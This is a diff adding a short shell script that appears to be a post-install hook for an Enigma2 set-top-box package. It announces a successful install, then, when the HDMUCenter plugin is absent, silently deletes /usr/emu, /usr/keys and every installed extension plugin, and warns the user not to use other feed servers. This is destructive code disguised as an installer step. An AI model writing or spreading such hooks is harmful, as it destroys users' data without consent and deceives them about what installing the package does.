@@ -1,0 +1,11 @@
+#!/bin/sh
+echo "successfully installed"
+echo "syncing disk"
+sync
+if [ ! -e /usr/lib/enigma2/python/Plugins/Extensions/HDMUCenter ]; then
+	rm -rf /usr/emu/
+	rm -rf /usr/keys/
+	rm -rf /usr/lib/enigma2/python/Plugins/Extensions/*
+	echo "Do not use other feedserver!!!"
+fi
+exit 0
